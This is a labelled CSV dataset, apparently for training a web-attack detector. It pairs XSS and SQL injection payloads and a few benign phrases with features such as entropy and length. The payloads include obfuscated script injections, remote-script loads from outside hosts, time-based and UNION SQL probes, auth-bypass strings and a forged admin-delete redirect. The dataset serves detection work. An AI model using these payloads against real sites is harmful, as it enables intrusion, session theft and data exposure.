input,label,length,entropy,num_quotes,has_script,has_sql_keywords,special_char_ratio
"<a href=""\x0Djavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"<IMG SRC=""javascript:alert('XSS')""",1,34,4.572469458770135,4,0,0,0.2647058745674743
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->,1,63,4.4616617734147725,0,0,0,0.34920634366339137
"<script a=`>` SRC=""http://www.securitycompass.com/xss.js""></script>",1,67,4.528869511954922,2,0,0,0.2835820853196704
AND 1=1,2,7,2.521640636343318,0,0,0,0.1428571224489825
ORDER BY 15--,2,13,3.238901256602631,0,0,0,0.15384614201183525
"UNION ALL SELECT 1,2",2,20,3.6464393446710157,0,0,1,0.04999999750000012
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
`'><script>-javascript:alert(1)</script>",1,96,4.566071484803186,2,1,0,0.28124999707031256
<input value=<><iframe/src=javascript:confirm(1),1,48,4.470175521464345,0,0,0,0.20833332899305565
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",1,101,4.685335584996687,2,1,0,0.23762376002352714
"UNION ALL SELECT 1,2,3,4,5,6,7--",2,32,4.030639062229566,0,0,1,0.24999999218750027
"`""'><img src=xxx:x \x00onerror=javascript:alert(1)>",1,51,4.61606645999253,2,0,0,0.2549019557862362
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,1,130,3.82871870307609,0,0,0,0.3307692282248521
"<;<;SCRIPT>;alert("";XSS"";);//<;<;/SCRIPT>;",1,42,3.885550458132468,2,0,0,0.5238095113378688
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#",2,51,4.24231363668625,6,0,1,0.3529411695501732
"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",1,110,4.925024968993863,8,0,0,0.39090908735537194
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))",2,150,4.327092615660265,0,0,1,0.2733333315111111
"<;DIV STYLE="";background-image:\0075\0072\006C\0028';\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.10530053\0027\0029';\0029"";>;",1,178,4.027856946769468,4,0,0,0.23595505485418508
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),1,66,4.769561308943035,2,0,0,0.25757575367309465
or 1=1/*,2,8,2.75,0,0,1,0.3749999531250059
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1,56,5.088343091584561,4,0,0,0.285714280612245
"<body onbeforeunload body onbeforeunload=""javascript:javascript:alert(1)""></body onbeforeunload>",1,96,4.462778287293878,2,0,0,0.12499999869791668
"<var onmouseover=""prompt(1)"">On Mouse Over</var>",1,48,4.252167324657883,2,0,0,0.20833332899305565
"&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;",1,76,4.704503500994273,0,0,0,0.24999999671052636
"<;SCRIPT ="";blah""; SRC="";http://ha.ckers.org/xss.js"";>;<;/SCRIPT>;",1,66,4.653872338891524,4,0,0,0.39393938797061534
<svg><script>//&NewLine;confirm(1);</script </svg>,1,50,4.438562939644917,0,1,0,0.31999999360000014
"><h1><IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>123</h1>",1,72,4.972163460365541,1,0,0,0.24999999652777782
"><h1><IFRAME SRC=# onmouseover=alert(document.cookie)""></IFRAME>123</h1>",1,72,4.972163460365541,1,0,0,0.24999999652777782
"<body onFocus body onFocus=""javascript:javascript:alert(1)""></body onFocus>",1,75,4.556854071114561,2,0,0,0.1599999978666667
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,1,147,4.856411831728683,0,0,0,0.19727891022259245
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--",2,76,4.406164311182223,2,0,0,0.31578946952908593
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>,1,968,3.194962702667923,0,0,0,0.36053718971018883
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",1,78,4.543218687940059,6,0,0,0.4358974303090073
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--",2,102,4.281597068805144,2,0,1,0.23529411534025377
"<![><img src=""]><img src=x onerror=alert(XSS)//"">",1,49,4.501866476503355,2,0,0,0.36734693127863405
new user registration,0,21,3.463280517810811,0,0,0,0.0
"<;IMG SRC=';vbscript:msgbox("";XSS"";)';>;",1,40,4.615311532225102,4,0,0,0.39999999000000025
"<IMG SRC=\""jav&#x0A;ascript:alert('XSS');\"">",1,44,4.970573095811685,4,0,0,0.36363635537190103
new user registration,0,21,3.463280517810811,0,0,0,0.0
\x3Cscript>javascript:alert(1)</script>,1,39,4.214262795507958,0,0,0,0.20512819986850772
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",1,46,4.276081999855836,2,0,0,0.43478259924385654
"<a href=""\xE2\x80\xA9javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.889975881446585,4,0,0,0.22784809838166964
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser,1,62,4.425002762798573,0,0,0,0.14516128798126957
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--",2,112,4.187463809747695,2,0,0,0.3214285685586735
"UNION ALL SELECT 1,2,3--",2,24,3.8553885422075336,0,0,1,0.1666666597222225
"><h1><iframe width=420"" height=""315"" src=""http://www.youtube.com/embed/sxvccpasgTE"" frameborder=""0"" allowfullscreen></iframe>123</h1>",1,133,4.9870572799080914,7,0,0,0.21804511114251796
ORDER BY SLEEP(5)#,2,18,3.6835423624332306,0,0,0,0.1666666574074079
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",1,62,4.350969045608525,2,0,0,0.22580644797086374
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#",2,120,4.133118026709314,2,0,0,0.3166666640277778
<SCRIPT SRC=%(jscript)s?<B>,1,27,4.384517131793098,0,0,0,0.2962962853223598
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",2,60,3.828072996388509,0,0,1,0.2999999950000001
"&lt;META HTTP-EQUIV=\""Link\"" Content=\""&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\""&gt;",1,112,4.9920558737139205,4,0,0,0.3214285685586735
"<IMG SRC=""javascript:alert('XSS');"">",1,36,4.68354236243323,4,0,0,0.3055555470679015
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,1,112,4.587189999000113,0,0,0,0.1696428556281888
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--",2,84,4.197119680563092,6,0,1,0.35714285289115655
<<SCRIPT>%(payload)s//<</SCRIPT>,1,32,4.101409765557392,0,1,0,0.3749999882812504
"&lt;SPAN DATASRC=\""#xss\"" DATAFLD=\""B\"" DATAFORMATAS=\""HTML\""&gt;&lt;/SPAN&gt;",1,78,4.44747598249954,6,0,0,0.32051281640368184
"<html onMouseDown html onMouseDown=""javascript:javascript:alert(1)""></html onMouseDown>",1,87,4.626249605209043,2,0,0,0.13793103289734446
"<a href=""data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="">test</a>",1,85,5.198875018613219,2,0,0,0.1529411746712803
AnD SLEEP(5)--,2,14,3.521640636343318,0,0,0,0.2857142653061239
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",1,59,4.578648185471206,2,0,0,0.3389830451019823
"<XSS STYLE=""behavior: url(xss.htc);"">",1,37,4.810672622327235,2,0,0,0.2702702629656686
"&lt;SCRIPT a=\""&gt;\"" '' SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",1,94,4.732892474088854,6,0,0,0.4042553148483477
"<body onload=""document.vulnerable=true;"">",1,41,4.210733711724087,2,0,0,0.19512194646044034
"<svg onLoad svg onLoad=""javascript:javascript:alert(1)""></svg onLoad>",1,69,4.438113138427714,2,0,0,0.173913040957782
"admin"") or (""1""=""1""/*",2,21,3.649001209710341,5,0,0,0.47619045351474026
"<BR SIZE=""&{alert('XSS')}"">",1,27,4.430632409490747,4,0,0,0.44444442798353967
"`""'><img src=xxx:x \x0Aonerror=javascript:alert(1)>",1,51,4.65528214626704,2,0,0,0.2549019557862362
"<body onResize body onResize=""javascript:javascript:alert(1)""></body onResize>",1,78,4.592719130409065,2,0,0,0.1538461518737673
&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;,1,131,3.7119481333704307,0,0,0,0.38931297412738186
new user registration,0,21,3.463280517810811,0,0,0,0.0
"<XSS STYLE=""behavior: url(xss.htc);"">",1,37,4.810672622327235,2,0,0,0.2702702629656686
"<img src=x\x10onerror=""javascript:alert(1)"">",1,44,4.544325652580697,2,0,0,0.22727272210743815
<embed src=%(jscript)s></embed>,1,31,4.091135423220312,0,0,0,0.29032257127991706
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE,1,41,4.113172736114331,0,0,0,0.21951218976799539
"<INPUT TYPE=""BUTTON"" action=""alert('XSS')""/>",1,44,4.686704345910025,6,0,0,0.2954545387396696
"<? foo=""><x foo='?><script>alert(1)</script>'>"">",1,48,4.313721875540867,4,1,0,0.43749999088541686
ORDER BY 24,2,11,3.095795255000934,0,0,0,0.0
view product details,0,20,3.8219280948873626,0,0,0,0.0
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.82978743205211,4,0,0,0.22784809838166964
"<body onPageHide body onPageHide=""javascript:javascript:alert(1)""></body onPageHide>",1,84,4.602796292364455,2,0,0,0.1428571411564626
http://www.<script>alert(1)</script .com,1,40,4.2373261452560085,0,1,0,0.2749999931250002
"admin"") or (""1""=""1",2,18,3.5032583347756456,4,0,0,0.3888888672839518
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",1,64,4.915873781480403,2,0,0,0.20312499682617194
"UNION ALL SELECT 1,2,3,4,5,6",2,28,3.910232940673185,0,0,1,0.17857142219387778
"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>",1,84,4.854990900043435,2,0,0,0.22619047349773247
<marquee><script>alert('XSS')</script></marquee>,1,48,4.153107168362811,2,1,0,0.2916666605902779
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",2,42,4.041625614369223,0,0,1,0.2857142789115648
upload profile picture,0,22,3.6069367321753214,0,0,0,0.0
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
) or pg_sleep(5)--",2,75,3.825289857076009,1,0,0,0.30666666257777786
ORDER BY 7#,2,11,3.095795255000934,0,0,0,0.09090908264462885
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1,96,4.829986855772667,2,0,0,0.22916666427951393
 or 'x'='x,2,10,2.4464393446710155,3,0,0,0.39999996000000404
"`>ABC<div style=font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';"">DEF",1,79,5.132523469531776,4,0,0,0.26582278144528126
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--",2,220,4.249846225110409,0,0,1,0.29090908958677686
<frameset onload=javascript:javascript:alert(1)></frameset>,1,59,4.343169804898952,0,0,0,0.16949152255099115
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;,1,66,4.472445544178841,0,0,0,0.30303029843893486
file uploaded successfully,0,26,3.5364142371222305,0,0,0,0.0
"<a href=""\xE2\x80\x84javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.864659425750382,4,0,0,0.22784809838166964
"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",1,72,4.6428647666912815,0,0,0,0.19444444174382722
"<a href=""\xE2\x80\x83javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,79,4.864659425750382,4,0,0,0.22784809838166964
"<IMG SRC=x onsuspend=""alert(String.fromCharCode(88,83,83))"">",1,60,4.923231428797621,2,0,0,0.21666666305555562
"<div STYLE=""width: expression(document.vulnerable=true);"">",1,58,4.857306856898128,2,0,0,0.1896551691438764
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#",2,59,3.802489558629629,0,0,1,0.28813558833668496
" or ""*",2,6,2.2516291673878226,1,0,0,0.33333327777778704
ORDER BY 14#,2,12,3.2516291673878226,0,0,0,0.08333332638888948
"<a href=""javas\x05cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
%3cscript%3ealert('XSS')%3c/script%3e,1,37,3.9050030276156957,2,0,0,0.24324323666910172
^,2,1,-0.0,0,0,0,0.9999990000010001
"&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\""javas&lt;!-- --&gt;cript&#58;alert('XSS')\""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;",1,133,4.485012329060601,6,0,0,0.42857142534908704
"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1,58,4.633505994978367,5,0,0,0.36206895927467314
"<a href=""javas\x02cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.710580788978146,4,0,0,0.22535210950208298
"#""><img src=M onerror=alert('XSS');>",1,36,4.458546099374622,3,0,0,0.33333332407407434
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,1,42,4.011980078706449,2,0,0,0.3333333253968256
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",1,34,4.065260267657296,2,1,0,0.41176469377162667
<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1),1,66,4.769561308943035,2,0,0,0.25757575367309465
admin') or '1'='1'--,2,20,3.441446071165522,5,0,0,0.4499999775000011
<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/,1,97,4.213703790435894,2,0,0,0.37113401679243285
view product details,0,20,3.8219280948873626,0,0,0,0.0
)) or sleep(5)=,2,15,3.323231428797621,0,0,0,0.3333333111111126
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#",2,83,4.177489909104561,6,0,1,0.3493975861518363
"<div STYLE=""background-image: url(&#1;javascript:document.vulnerable=true;)"">",1,77,4.997659600267739,2,0,0,0.20779220509360774
<frameset onload=alert(123)>,1,28,4.182005814760214,0,0,0,0.17857142219387778
<svg/onload=%26%23097lert%26lpar;1337)>,1,39,4.541311192999329,0,0,0,0.2307692248520712
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))",2,208,4.229410862856335,0,0,1,0.28365384479012573
"<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",1,87,4.597442278465635,2,0,0,0.13793103289734446
<script\x2F>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23",2,118,4.4583736571072725,2,0,1,0.29661016697787995
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#",2,113,4.430341336551741,0,0,1,0.2654867233142768
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",1,60,5.067481795998514,4,0,0,0.23333332944444451
"<IMG SRC=""jav ascript:javascript:alert(1);"">",1,44,4.570353994119939,2,0,0,0.22727272210743815
&#x003c,1,7,2.521640636343318,0,0,0,0.285714244897965
"UNION ALL SELECT 1,2,3,4,5",2,26,3.873140679513133,0,0,1,0.15384614792899431
<;IMG SRC=javascript:alert(';XSS';)>;,1,37,4.574054041187682,2,0,0,0.3243243155588023
"><h1><IFRAME SRC=javascript:alert('XSS');""></IFRAME>"">123</h1>",1,62,4.913400745661377,4,0,0,0.33870967195629564
read the documentation,0,22,3.572623663895164,0,0,0,0.0
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",1,425,5.762252241840229,6,0,0,0.05647058810242215
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;,1,68,4.445949474444727,0,0,0,0.26470587846020766
"&lt;TABLE&gt;&lt;TD BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",1,67,5.047599176166317,4,0,0,0.298507458231232
<script\x20>javascript:alert(1)</script>,1,40,4.227567157116929,0,0,0,0.22499999437500015
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",1,96,4.525278287293878,2,0,0,0.12499999869791668
"ABC<div style=""x:\x0Aexpression(javascript:alert(1)"">DEF",1,56,4.847097109364437,2,0,0,0.19642856792091845
<iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>,1,57,4.370011453019932,2,0,0,0.24561403077870123
"<a href=""\x17javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",1,71,4.671779556553309,4,0,0,0.22535210950208298
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))",2,57,4.370011453019932,0,0,1,0.1929824527546938
"<img \x00src=x onerror=""alert(1)"">",1,34,4.3342381214139625,2,0,0,0.2647058745674743
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--",2,93,4.151500709963095,6,0,1,0.35483870586194943
"<applet onError applet onError=""javascript:javascript:alert(1)""></applet onError>",1,81,4.197271298913826,2,0,0,0.14814814631915868
1script3document.vulnerable=true;1/script3,1,42,4.261132303628119,0,0,0,0.0952380929705216
"<form><button formaction=""javascript:alert(123)"">crosssitespt",1,61,4.48827535589009,2,0,0,0.16393442354205864
<IMG SRC=javascript:alert('XSS')>,1,33,4.574400937409153,2,0,0,0.2424242350780535
"<IMG SRC=x oncontextmenu=""alert(String.fromCharCode(88,83,83))"">",1,64,4.831954882778696,2,0,0,0.20312499682617194
add to cart,0,11,2.7321588913645702,0,0,0,0.0
"1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",2,74,4.6231820415038944,4,0,1,0.08108107998539081
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6--",2,48,4.191340563438216,6,0,1,0.35416665928819463
ORDER BY SLEEP(5)--,2,19,3.6818808028034025,0,0,0,0.21052630470914185
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#",2,75,4.6198715643217865,2,0,1,0.2799999962666667
<BODY ONLOAD=javascript:alert(1)>,1,33,4.574400937409153,0,0,0,0.18181817630854014
&#X3C,1,5,2.321928094887362,0,0,0,0.399999920000016
"<style></style\x3E<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1,79,4.737669679659489,2,0,0,0.2531645537574107
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;,1,155,4.346381225859891,0,0,0,0.3677419331113424
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-,1,81,4.565694485567162,0,0,0,0.14814814631915868
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--",2,85,4.321664311818176,2,0,0,0.31764705508650526
")) or ((x""))=((""x",2,17,2.7933451941915157,2,0,0,0.6470587854671302
reset your password,0,19,3.431623565847431,0,0,0,0.0
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14",2,67,4.231765252318885,6,0,1,0.34328357696591677
user@example.com,0,16,3.577819531114783,0,0,0,0.12499999218750048
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",1,96,4.525278287293878,2,0,0,0.12499999869791668
"<script src=""data:\xD4\x8F,javascript:alert(1)""></script>",1,57,4.56379007683777,2,0,0,0.26315789012003704
"<IMG SRC=x onsubmit=""alert(String.fromCharCode(88,83,83))"">",1,59,4.929004701794208,2,0,0,0.22033897931628849
"<img src=1 href=1 onerror=""javascript:alert(1)""></img>",1,54,4.529316956471171,2,0,0,0.24074073628257897
<IMG SRC=`javascript:javascript:alert(1)`>,1,42,4.508521816141528,0,0,0,0.2142857091836736
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14",2,91,4.598264999799322,2,0,1,0.2857142825745683
"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",1,85,5.072346930352472,4,0,0,0.23529411487889276
%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e',1,50,3.983465189601647,3,0,0,0.1999999960000001
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",1,57,4.788858873737953,2,0,0,0.2280701714373654
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",1,106,5.554301322545199,4,0,0,0.1320754704521182
